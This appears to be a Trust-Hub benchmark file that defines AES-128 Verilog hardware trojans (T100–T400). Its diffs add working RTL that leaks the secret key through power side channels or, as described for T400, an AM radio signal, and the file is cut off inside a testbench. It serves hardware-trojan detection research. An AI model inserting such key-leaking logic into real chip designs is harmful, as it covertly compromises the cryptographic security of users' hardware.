<?xml version="1.0" encoding="UTF-8"?>
<benchmark uid="9174c9c3-f7ae-4743-817f-b2f29c001c23" suite="trusthub" name="aes" language="verilog">
  <archive>
		<checksum type="sha256">a1df16f8da6deab0ea0611a7c5fdd8d1fd6da0f90c0197eb68c64a09af868caf</checksum>
		<url>https://www.trust-hub.org/index.php/resources/1018/download/AES-T100.zip</url>
	</archive>
  <decompress>unzip AES-T100.zip</decompress>
  <normalize>
		#!/bin/bash

		#TjFree part
		ln -s round.v AES-T100/src/TjFree/one_round.v
		ln -s table.v AES-T100/src/TjFree/table_lookup.v
		#TjIn part
		ln -s lfsr.v AES-T100/src/TjIn/lfsr_counter.v
		ln -s round.v AES-T100/src/TjIn/one_round.v
		ln -s table.v AES-T100/src/TjIn/table_lookup.v

		find . -depth -exec rename 's/(.*)\/([^\/]*)/$1\/\L$2/' {} \;
		mv aes-t100 aes
		rm -rf aes/src/tjin
		dos2unix aes/src/tjfree/*
  </normalize>
	<bugfix>
	</bugfix>
  <original_design>
    <top_file>./aes/src/tjfree/aes_128.v</top_file>
    <top_module>aes_128</top_module>
  </original_design>
  <trojan uid="4fe14c60-3fcd-48b1-94ef-2da6b34df83c" name="t100" abstraction_level="rtl" technology="">
	<trojan_description>
	1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	The Trojan leaks the secret key from a cryptographic chip running the AES algorithm through a covert channel. 
	The channel adapts the concepts from spread spectrum communications (also known as Code-Division Multiple Access (CDMA)) 
	to distribute the leakage of single bits over many clock cycles. The Trojan employs this method by using 
	a pseudo-random number generator (PRNG) to create a CDMA code sequence, the PRNG initialized to a predefined value. 
	The code sequence is then used to XOR modulate the secret information bits. The modulated sequence is forwarded to 
	a leakage circuit (LC) to set up a covert CDMA channel in the power side-channel. The LC is realized by connecting 
	eight identical flip-flop elements to the single output of the XOR gate to mimic a large capacitance [1].


Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Always on
	Effects: Leak Information
	Location: Processor
	Physical characteristics: Functional


[1] L. Lin, M. Kasper, T. G.neysu, C. Paar and W. Burleson, "Trojan Side-Channels: Lightweight Hardware Trojans 
through Side-Channel Engineering," 11th International Workshop Cryptographic Hardware and Embedded Systems (CHES), 
pp.382-395, 2009.
	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/lfsr_counter.v aes/src/tjin-t100/lfsr_counter.v
--- aes/src/tjfree/lfsr_counter.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t100/lfsr_counter.v	2015-08-21 12:09:52.697423309 +0200
@@ -0,0 +1,22 @@
+
+// It implements X^20 + X^13 + X^9 + X^5 + 1
+module lfsr_counter (
+	input rst, clk, 
+   output [19:0] lfsr
+	);
+
+	reg [19:0] lfsr_stream;
+	wire d0; 
+	
+	
+	assign lfsr = lfsr_stream; 
+	assign d0 = lfsr_stream[15] ^ lfsr_stream[11] ^ lfsr_stream[7] ^ lfsr_stream[0]; 
+
+	always @(posedge clk)
+		if (rst == 1) begin
+			lfsr_stream &lt;= &quot;10011001100110011001&quot;;
+		end else begin
+			lfsr_stream &lt;= {d0,lfsr_stream[19:1]}; 
+		end
+		
+endmodule
\ No newline at end of file
diff -rupN aes/src/tjfree/lfsr.v aes/src/tjin-t100/lfsr.v
--- aes/src/tjfree/lfsr.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t100/lfsr.v	2015-08-21 12:09:52.697423309 +0200
@@ -0,0 +1,22 @@
+
+// It implements X^20 + X^13 + X^9 + X^5 + 1
+module lfsr_counter (
+	input rst, clk, 
+   output [19:0] lfsr
+	);
+
+	reg [19:0] lfsr_stream;
+	wire d0; 
+	
+	
+	assign lfsr = lfsr_stream; 
+	assign d0 = lfsr_stream[15] ^ lfsr_stream[11] ^ lfsr_stream[7] ^ lfsr_stream[0]; 
+
+	always @(posedge clk)
+		if (rst == 1) begin
+			lfsr_stream &lt;= &quot;10011001100110011001&quot;;
+		end else begin
+			lfsr_stream &lt;= {d0,lfsr_stream[19:1]}; 
+		end
+		
+endmodule
\ No newline at end of file
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t100/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t100/top.v	2015-08-21 12:09:52.697423309 +0200
@@ -0,0 +1,33 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:02:52 03/06/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(
+    input clk,
+    input rst,
+    input [127:0] state,
+    input [127:0] key,
+    output [127:0] out,
+	 output [63:0] Capacitance
+    );
+
+	aes_128 AES  (clk, state, key, out); 
+	TSC Trojan (rst, clk, key, Capacitance); 
+
+endmodule
diff -rupN aes/src/tjfree/tsc.v aes/src/tjin-t100/tsc.v
--- aes/src/tjfree/tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t100/tsc.v	2015-08-21 12:09:52.701423309 +0200
@@ -0,0 +1,107 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:20:01 03/06/2013 
+// Design Name: 
+// Module Name:    TSC 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module TSC(
+    input rst,
+    input clk,
+    input [127:0] key,
+	 output [63:0] load
+    );
+
+	reg [63:0] load;
+	wire [19: 0] counter;
+	
+	lfsr_counter lfsr (rst, clk, counter);
+	always @ (posedge clk)
+		begin
+			load[0] &lt;= key[0] ^ counter[0];	
+			load[1] &lt;= key[0] ^ counter[0];	
+			load[2] &lt;= key[0] ^ counter[0];	
+			load[3] &lt;= key[0] ^ counter[0];	
+			load[4] &lt;= key[0] ^ counter[0];	
+			load[5] &lt;= key[0] ^ counter[0];	
+			load[6] &lt;= key[0] ^ counter[0];	
+			load[7] &lt;= key[0] ^ counter[0];	
+			
+			load[8] &lt;= key[1] ^ counter[1];	
+			load[9] &lt;= key[1] ^ counter[1];	
+			load[10] &lt;= key[1] ^ counter[1];	
+			load[11] &lt;= key[1] ^ counter[1];	
+			load[12] &lt;= key[1] ^ counter[1];	
+			load[13] &lt;= key[1] ^ counter[1];	
+			load[14] &lt;= key[1] ^ counter[1];	
+			load[15] &lt;= key[1] ^ counter[1];	
+			
+			load[16] &lt;= key[2] ^ counter[2];	
+			load[17] &lt;= key[2] ^ counter[2];	
+			load[18] &lt;= key[2] ^ counter[2];	
+			load[19] &lt;= key[2] ^ counter[2];	
+			load[20] &lt;= key[2] ^ counter[2];	
+			load[21] &lt;= key[2] ^ counter[2];	
+			load[22] &lt;= key[2] ^ counter[2];	
+			load[23] &lt;= key[2] ^ counter[2];	
+			
+			load[24] &lt;= key[3] ^ counter[3];	
+			load[25] &lt;= key[3] ^ counter[3];	
+			load[26] &lt;= key[3] ^ counter[3];	
+			load[27] &lt;= key[3] ^ counter[3];	
+			load[28] &lt;= key[3] ^ counter[3];	
+			load[29] &lt;= key[3] ^ counter[3];	
+			load[30] &lt;= key[3] ^ counter[3];				
+			load[31] &lt;= key[3] ^ counter[3];				
+
+			load[32] &lt;= key[4] ^ counter[4];	
+			load[33] &lt;= key[4] ^ counter[4];	
+			load[34] &lt;= key[4] ^ counter[4];	
+			load[35] &lt;= key[4] ^ counter[4];	
+			load[36] &lt;= key[4] ^ counter[4];	
+			load[37] &lt;= key[4] ^ counter[4];	
+			load[38] &lt;= key[4] ^ counter[4];	
+			load[39] &lt;= key[4] ^ counter[4];	
+
+			load[40] &lt;= key[5] ^ counter[5];	
+			load[41] &lt;= key[5] ^ counter[5];	
+			load[42] &lt;= key[5] ^ counter[5];	
+			load[43] &lt;= key[5] ^ counter[5];	
+			load[44] &lt;= key[5] ^ counter[5];	
+			load[45] &lt;= key[5] ^ counter[5];	
+			load[46] &lt;= key[5] ^ counter[5];				
+			load[47] &lt;= key[5] ^ counter[5];				
+
+			load[48] &lt;= key[6] ^ counter[6];	
+			load[49] &lt;= key[6] ^ counter[6];				
+			load[50] &lt;= key[6] ^ counter[6];	
+			load[51] &lt;= key[6] ^ counter[6];	
+			load[52] &lt;= key[6] ^ counter[6];	
+			load[53] &lt;= key[6] ^ counter[6];	
+			load[54] &lt;= key[6] ^ counter[6];	
+			load[55] &lt;= key[6] ^ counter[6];
+			
+			load[56] &lt;= key[7] ^ counter[7];	
+			load[57] &lt;= key[7] ^ counter[7];	
+			load[58] &lt;= key[7] ^ counter[7];	
+			load[59] &lt;= key[7] ^ counter[7];	
+			load[60] &lt;= key[7] ^ counter[7];	
+			load[61] &lt;= key[7] ^ counter[7];	
+			load[62] &lt;= key[7] ^ counter[7];	
+			load[63] &lt;= key[7] ^ counter[7];				
+		end
+	
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="5bdec9e0-cd23-4da6-bb6e-5230b2ea15a7" name="t200" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	The Trojan leaks the secret key from a cryptographic chip running the AES algorithm through a covert channel. 
	The channel adapts the concepts from spread spectrum communications (also known as Code-Division Multiple Access (CDMA)) 
	to distribute the leakage of single bits over many clock cycles. The Trojan employs this method by using 
	a pseudo-random number generator (PRNG) to create a CDMA code sequence, the PRNG initialized to the input plaintext.
	The code sequence is then used to XOR modulate the secret information bits. The modulated sequence is forwarded to 
	a leakage circuit (LC) to set up a covert CDMA channel in the power side-channel. The LC is realized by connecting 
	eight identical flip-flop elements to the single output of the XOR gate to mimic a large capacitance [1].


Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Always on
	Effects: Leak Information
	Location: Processor
	Physical characteristics: Functional


[1] L. Lin, M. Kasper, T. G.neysu, C. Paar and W. Burleson, "Trojan Side-Channels: Lightweight Hardware Trojans 
through Side-Channel Engineering," 11th International Workshop Cryptographic Hardware and Embedded Systems (CHES), 
pp.382-395, 2009.

	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/lfsr_counter.v aes/src/tjin-t200/lfsr_counter.v
--- aes/src/tjfree/lfsr_counter.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t200/lfsr_counter.v	2015-08-21 12:09:52.717423309 +0200
@@ -0,0 +1,23 @@
+
+// It implements X^20 + X^13 + X^9 + X^5 + 1
+module lfsr_counter (
+	input rst, clk, 
+	input [127:0] data, 
+   output [19:0] lfsr 
+	);
+
+	reg [19:0] lfsr_stream;
+	wire d0; 
+	
+	
+	assign lfsr = lfsr_stream; 
+	assign d0 = lfsr_stream[15] ^ lfsr_stream[11] ^ lfsr_stream[7] ^ lfsr_stream[0]; 
+
+	always @(posedge clk)
+		if (rst == 1) begin
+			lfsr_stream &lt;= data[19:0];
+		end else begin
+			lfsr_stream &lt;= {d0,lfsr_stream[19:1]}; 
+		end
+		
+endmodule
\ No newline at end of file
diff -rupN aes/src/tjfree/lfsr.v aes/src/tjin-t200/lfsr.v
--- aes/src/tjfree/lfsr.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t200/lfsr.v	2015-08-21 12:09:52.717423309 +0200
@@ -0,0 +1,23 @@
+
+// It implements X^20 + X^13 + X^9 + X^5 + 1
+module lfsr_counter (
+	input rst, clk, 
+	input [127:0] data, 
+   output [19:0] lfsr 
+	);
+
+	reg [19:0] lfsr_stream;
+	wire d0; 
+	
+	
+	assign lfsr = lfsr_stream; 
+	assign d0 = lfsr_stream[15] ^ lfsr_stream[11] ^ lfsr_stream[7] ^ lfsr_stream[0]; 
+
+	always @(posedge clk)
+		if (rst == 1) begin
+			lfsr_stream &lt;= data[19:0];
+		end else begin
+			lfsr_stream &lt;= {d0,lfsr_stream[19:1]}; 
+		end
+		
+endmodule
\ No newline at end of file
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t200/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t200/top.v	2015-08-21 12:09:52.717423309 +0200
@@ -0,0 +1,33 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:02:52 03/06/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(
+    input clk,
+    input rst,
+    input [127:0] state,
+    input [127:0] key,
+    output [127:0] out,
+	 output [63:0] Capacitance
+    );
+
+	aes_128 AES  (clk, state, key, out); 
+	TSC Trojan (rst, clk, key, state, Capacitance);
+
+endmodule
diff -rupN aes/src/tjfree/tsc.v aes/src/tjin-t200/tsc.v
--- aes/src/tjfree/tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t200/tsc.v	2015-08-21 12:09:52.717423309 +0200
@@ -0,0 +1,108 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:20:01 03/06/2013 
+// Design Name: 
+// Module Name:    TSC 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module TSC(
+    input rst,
+    input clk,
+    input [127:0] key,
+	 input [127:0] data,
+	 output [63:0] load
+    );
+
+	reg [63:0] load;
+	wire [19: 0] counter;
+	
+	lfsr_counter lfsr (rst, clk, data, counter);
+	always @ (posedge clk)
+		begin
+			load[0] &lt;= key[0] ^ counter[0];	
+			load[1] &lt;= key[0] ^ counter[0];	
+			load[2] &lt;= key[0] ^ counter[0];	
+			load[3] &lt;= key[0] ^ counter[0];	
+			load[4] &lt;= key[0] ^ counter[0];	
+			load[5] &lt;= key[0] ^ counter[0];	
+			load[6] &lt;= key[0] ^ counter[0];	
+			load[7] &lt;= key[0] ^ counter[0];	
+			
+			load[8] &lt;= key[1] ^ counter[1];	
+			load[9] &lt;= key[1] ^ counter[1];	
+			load[10] &lt;= key[1] ^ counter[1];	
+			load[11] &lt;= key[1] ^ counter[1];	
+			load[12] &lt;= key[1] ^ counter[1];	
+			load[13] &lt;= key[1] ^ counter[1];	
+			load[14] &lt;= key[1] ^ counter[1];	
+			load[15] &lt;= key[1] ^ counter[1];	
+			
+			load[16] &lt;= key[2] ^ counter[2];	
+			load[17] &lt;= key[2] ^ counter[2];	
+			load[18] &lt;= key[2] ^ counter[2];	
+			load[19] &lt;= key[2] ^ counter[2];	
+			load[20] &lt;= key[2] ^ counter[2];	
+			load[21] &lt;= key[2] ^ counter[2];	
+			load[22] &lt;= key[2] ^ counter[2];	
+			load[23] &lt;= key[2] ^ counter[2];	
+			
+			load[24] &lt;= key[3] ^ counter[3];	
+			load[25] &lt;= key[3] ^ counter[3];	
+			load[26] &lt;= key[3] ^ counter[3];	
+			load[27] &lt;= key[3] ^ counter[3];	
+			load[28] &lt;= key[3] ^ counter[3];	
+			load[29] &lt;= key[3] ^ counter[3];	
+			load[30] &lt;= key[3] ^ counter[3];				
+			load[31] &lt;= key[3] ^ counter[3];				
+
+			load[32] &lt;= key[4] ^ counter[4];	
+			load[33] &lt;= key[4] ^ counter[4];	
+			load[34] &lt;= key[4] ^ counter[4];	
+			load[35] &lt;= key[4] ^ counter[4];	
+			load[36] &lt;= key[4] ^ counter[4];	
+			load[37] &lt;= key[4] ^ counter[4];	
+			load[38] &lt;= key[4] ^ counter[4];	
+			load[39] &lt;= key[4] ^ counter[4];	
+
+			load[40] &lt;= key[5] ^ counter[5];	
+			load[41] &lt;= key[5] ^ counter[5];	
+			load[42] &lt;= key[5] ^ counter[5];	
+			load[43] &lt;= key[5] ^ counter[5];	
+			load[44] &lt;= key[5] ^ counter[5];	
+			load[45] &lt;= key[5] ^ counter[5];	
+			load[46] &lt;= key[5] ^ counter[5];				
+			load[47] &lt;= key[5] ^ counter[5];				
+
+			load[48] &lt;= key[6] ^ counter[6];	
+			load[49] &lt;= key[6] ^ counter[6];				
+			load[50] &lt;= key[6] ^ counter[6];	
+			load[51] &lt;= key[6] ^ counter[6];	
+			load[52] &lt;= key[6] ^ counter[6];	
+			load[53] &lt;= key[6] ^ counter[6];	
+			load[54] &lt;= key[6] ^ counter[6];	
+			load[55] &lt;= key[6] ^ counter[6];
+			
+			load[56] &lt;= key[7] ^ counter[7];	
+			load[57] &lt;= key[7] ^ counter[7];	
+			load[58] &lt;= key[7] ^ counter[7];	
+			load[59] &lt;= key[7] ^ counter[7];	
+			load[60] &lt;= key[7] ^ counter[7];	
+			load[61] &lt;= key[7] ^ counter[7];	
+			load[62] &lt;= key[7] ^ counter[7];	
+			load[63] &lt;= key[7] ^ counter[7];				
+		end
+	
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="32e9d334-5623-43c5-bc39-6eef9b22b084" name="t300" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	The Trojan demonstrates an attack on the AES-128 block-cipher and its corresponding key schedule. 
	The idea is to artificially introduce leaking intermediate states in the key schedule that depend 
	on known input bits and key bits, but that naturally would not occur during regular processing of 
	the cipher. The Trojan uses AND conjunctions to pairwise combine each key bit with another input bit. 
	The output of the AND gates are then combined to the leaked intermediate value by XORing all of them. 
	The Trojan leaks one byte of the AES round key for each round of the key schedule. The leakage circuit (LC) 
	is a 16-bit shift register and loaded it with an initial alternating sequence of zeros and ones. 
	The shift register is only enabled in case the input to the leakage circuit is one, which results in 
	an additional dynamic power consumption [1].


Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Always on
	Effects: Leak Information
	Location: Processor
	Physical characteristics: Functional


[1] L. Lin, M. Kasper, T. G.neysu, C. Paar and W. Burleson, "Trojan Side-Channels: Lightweight Hardware Trojans 
through Side-Channel Engineering," 11th International Workshop Cryptographic Hardware and Embedded Systems (CHES), 
pp.382-395, 2009.
	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/aes_128.v aes/src/tjin-t300/aes_128.v
--- aes/src/tjfree/aes_128.v	2015-09-09 16:38:27.821921496 +0200
+++ aes/src/tjin-t300/aes_128.v	2015-08-21 12:09:52.721423309 +0200
@@ -14,10 +14,11 @@
  * limitations under the License.
  */
 
-module aes_128(clk, state, key, out);
+module aes_128(clk, state, key, out, rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8);
     input          clk;
     input  [127:0] state, key;
-    output [127:0] out;
+    output [127:0] out;
+	 output [127:0] rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8;
     reg    [127:0] s0, k0;
     wire   [127:0] s1, s2, s3, s4, s5, s6, s7, s8, s9,
                    k1, k2, k3, k4, k5, k6, k7, k8, k9,
@@ -27,7 +28,16 @@ module aes_128(clk, state, key, out);
       begin
         s0 &lt;= state ^ key;
         k0 &lt;= key;
-      end
+      end
+
+	 assign rk1 = k1;
+	 assign rk2 = k2;
+	 assign rk3 = k3;
+	 assign rk4 = k4;
+	 assign rk5 = k5;
+	 assign rk6 = k6;
+	 assign rk7 = k7;
+	 assign rk8 = k8;
 
     expand_key_128
         a1 (clk, k0, k1, k0b, 8&apos;h1),
diff -rupN aes/src/tjfree/top.v aes/src/tjin-t300/top.v
--- aes/src/tjfree/top.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t300/top.v	2015-08-21 12:09:52.721423309 +0200
@@ -0,0 +1,34 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:02:52 03/06/2013 
+// Design Name: 
+// Module Name:    top 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module top(
+    input clk,
+    input rst,
+    input [127:0] state,
+    input [127:0] key,
+    output [127:0] out
+    );
+
+	wire [127:0] rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8;
+	
+	aes_128 AES  (clk, state, key, out, rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8); 
+	TSC Trojan (rst, clk, state, rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8);
+
+endmodule
diff -rupN aes/src/tjfree/tsc.v aes/src/tjin-t300/tsc.v
--- aes/src/tjfree/tsc.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t300/tsc.v	2015-08-21 12:09:52.721423309 +0200
@@ -0,0 +1,134 @@
+`timescale 1ns / 1ps
+//////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer: 
+// 
+// Create Date:    12:20:01 03/06/2013 
+// Design Name: 
+// Module Name:    TSC 
+// Project Name: 
+// Target Devices: 
+// Tool versions: 
+// Description: 
+//
+// Dependencies: 
+//
+// Revision: 
+// Revision 0.01 - File Created
+// Additional Comments: 
+//
+//////////////////////////////////////////////////////////////////////////////////
+module TSC(
+	 input rst, clk, 
+    input [127:0] state,
+	 input [127:0] rk1, rk2, rk3, rk4, rk5, rk6, rk7, rk8
+    );
+
+	reg enable1, enable2, enable3, enable4, enable5, enable6, enable7, enable8;
+	reg [7:0] SHReg1, SHReg2, SHReg3, SHReg4, SHReg5, SHReg6, SHReg7, SHReg8;
+	always @ (rk1)
+		begin
+			enable1 &lt;= (state[0]&amp;rk1[0])^(state[1]&amp;rk1[1])^(state[2]&amp;rk1[2])^(state[3]&amp;rk1[3])^(state[4]&amp;rk1[4])^(state[5]&amp;rk1[5])^(state[6]&amp;rk1[6])^(state[7]&amp;rk1[7]);
+		end
+	always @ (rk2)
+		begin
+			enable2 &lt;= (state[0]&amp;rk2[0])^(state[1]&amp;rk2[1])^(state[2]&amp;rk2[2])^(state[3]&amp;rk2[3])^(state[4]&amp;rk2[4])^(state[5]&amp;rk2[5])^(state[6]&amp;rk2[6])^(state[7]&amp;rk2[7]);
+		end
+	always @ (rk3)
+		begin
+			enable3 &lt;= (state[0]&amp;rk3[0])^(state[1]&amp;rk3[1])^(state[2]&amp;rk3[2])^(state[3]&amp;rk3[3])^(state[4]&amp;rk3[4])^(state[5]&amp;rk3[5])^(state[6]&amp;rk3[6])^(state[7]&amp;rk3[7]);
+		end
+	always @ (rk4)
+		begin
+			enable4 &lt;= (state[0]&amp;rk4[0])^(state[1]&amp;rk4[1])^(state[2]&amp;rk4[2])^(state[3]&amp;rk4[3])^(state[4]&amp;rk4[4])^(state[5]&amp;rk4[5])^(state[6]&amp;rk4[6])^(state[7]&amp;rk4[7]);
+		end
+	always @ (rk5)
+		begin
+			enable5 &lt;= (state[0]&amp;rk5[0])^(state[1]&amp;rk5[1])^(state[2]&amp;rk5[2])^(state[3]&amp;rk5[3])^(state[4]&amp;rk5[4])^(state[5]&amp;rk5[5])^(state[6]&amp;rk5[6])^(state[7]&amp;rk5[7]);
+		end
+	always @ (rk6)
+		begin
+			enable6 &lt;= (state[0]&amp;rk6[0])^(state[1]&amp;rk6[1])^(state[2]&amp;rk6[2])^(state[3]&amp;rk6[3])^(state[4]&amp;rk6[4])^(state[5]&amp;rk6[5])^(state[6]&amp;rk6[6])^(state[7]&amp;rk6[7]);
+		end
+	always @ (rk7)
+		begin
+			enable7 &lt;= (state[0]&amp;rk7[0])^(state[1]&amp;rk7[1])^(state[2]&amp;rk7[2])^(state[3]&amp;rk7[3])^(state[4]&amp;rk7[4])^(state[5]&amp;rk7[5])^(state[6]&amp;rk7[6])^(state[7]&amp;rk7[7]);
+		end
+	always @ (rk8)
+		begin
+			enable8 &lt;= (state[0]&amp;rk8[0])^(state[1]&amp;rk8[1])^(state[2]&amp;rk8[2])^(state[3]&amp;rk8[3])^(state[4]&amp;rk8[4])^(state[5]&amp;rk8[5])^(state[6]&amp;rk8[6])^(state[7]&amp;rk8[7]);
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg1 &lt;= &quot;10101010&quot;;
+			end else if (enable1 == 1) begin
+					SHReg1 &lt;= {SHReg1[0], SHReg1[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg2 &lt;= &quot;10101010&quot;;
+			end else if (enable2 == 1) begin
+					SHReg2 &lt;= {SHReg2[0], SHReg2[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg3 &lt;= &quot;10101010&quot;;
+			end else if (enable3 == 1) begin
+					SHReg3 &lt;= {SHReg3[0], SHReg3[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg4 &lt;= &quot;10101010&quot;;
+			end else if (enable4 == 1) begin
+					SHReg4 &lt;= {SHReg4[0], SHReg4[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg5 &lt;= &quot;10101010&quot;;
+			end else if (enable5 == 1) begin
+					SHReg5 &lt;= {SHReg5[0], SHReg5[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg6 &lt;= &quot;10101010&quot;;
+			end else if (enable6 == 1) begin
+					SHReg6 &lt;= {SHReg6[0], SHReg6[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg7 &lt;= &quot;10101010&quot;;
+			end else if (enable7 == 1) begin
+					SHReg7 &lt;= {SHReg7[0], SHReg7[7:1]}; 
+			end 
+		end
+
+	always @(clk)
+		begin
+			if (rst == 1) begin
+					SHReg8 &lt;= &quot;10101010&quot;;
+			end else if (enable8 == 1) begin
+					SHReg8 &lt;= {SHReg8[0], SHReg8[7:1]}; 
+			end 
+		end
+
+endmodule
  </trojan_patch>    
  </trojan>
  <trojan uid="04d2955d-470c-4dbf-8749-5b564b36e553" name="t400" abstraction_level="rtl" technology="">
	<trojan_description>
1.Home directory includes:

1.1 src
	---Codes for the AES algorithm, the test bench, and the Trojan

2.Trojan
Trojan Description
	Modulating an (unused) pin on a chip generates an RF signal. This signal can be used to transmit the key bits. 
	This attack is performed at 1560 KHz and can be received with an ordinary AM radio. The data carried by 
	the AM signal needs to be easily interpreted by a human. A beep scheme is utilized where a single beep followed 
	by a pause represents a .0. and a double beep followed by a pause represents a .1.. A description on detail 
	implementation of AM transmission can be found at [1]. In this implementation, the Trojan gets activated when a
	predefined input plaintext is observed. 


Trojan Taxonomy
	Insertion phase: Design
	Abstraction level: Register Transfer level  
	Activation mechanism: Internally conditionally triggered
	Effects: Leak Information
 	Location: Processor
	Physical characteristics: Functional


[1] Alex Baumgarten, Michael Steffen, Matthew Clausman, Joseph Zambreno, 
"A case study in hardware Trojan design and implementation," 
International Journal of Information Security, Volume 10, Issue 1, pp 1-14, 2011
	</trojan_description>
  <trojan_patch>
diff -rupN aes/src/tjfree/aes_128.v aes/src/tjin-t400/aes_128.v
--- aes/src/tjfree/aes_128.v	2015-09-09 16:38:27.821921496 +0200
+++ aes/src/tjin-t400/aes_128.v	2015-08-21 12:09:52.721423309 +0200
@@ -14,7 +14,7 @@
  * limitations under the License.
  */
 
-module aes_128(clk, state, key, out);
+module aes_128(clk, state, key, out);
     input          clk;
     input  [127:0] state, key;
     output [127:0] out;
diff -rupN aes/src/tjfree/aes_tb.v aes/src/tjin-t400/aes_tb.v
--- aes/src/tjfree/aes_tb.v	1970-01-01 01:00:00.000000000 +0100
+++ aes/src/tjin-t400/aes_tb.v	2015-08-21 12:09:52.721423309 +0200
@@ -0,0 +1,70 @@
+`timescale 1ns / 1ps
+
+////////////////////////////////////////////////////////////////////////////////
+// Company: 
+// Engineer:
+//
+// Create Date:   16:20:11 03/08/2013
+// Design Name:   top
+// Module Name:   D:/TrustHUB/HardwareTrojan/AES/AES128/AES3/AM_Transmission/AES_tb.v
+// Project Name:  AM_Transmission
+// Target Device:  
+// Tool versions:  
+// Description: 
+//
+// Verilog Test Fixture created by ISE for module: top
+//
+// Dependencies:
+// 
+// Revision:
+// Revision 0.01 - File Created
+// Additional Comments:
+// 
+////////////////////////////////////////////////////////////////////////////////
+
+module AES_tb;
+
+	// Inputs
+	reg clk;
+	reg rst;
+	reg [127:0] state;
+	reg [127:0] key;
+
+	// Outputs
+	wire [127:0] out;
+	wire Antena;
+
+	// Instantiate the Unit Under Test (UUT)
+	top uut (
+		.clk(clk), 
+		.rst(rst), 
+		.state(state), 
+		.key(key), 
+		.out(out), 
+		.Antena(Antena)
+	);
+
+	initial begin
+		// Initialize Inputs
+		clk = 0;
+		rst = 0;
+		state = 0;
+		key = 0;
+
+		// Wait 100 ns for global reset to finish
+		#5;
+      rst = 1;     
+		state = 128&apos;hFFFFFFFF_FFFFFFFF_FFFFFFFF_FFFFFFFF;
+		//state = 128&apos;h3243f6a8_885a308d_313198a2_e0370734;
+      key   = 128&apos;haaaaaaaa_aaaaaaaa_aaaaaaaa_aaaaaaaa;
+
+		#15
+		rst = 0;
+
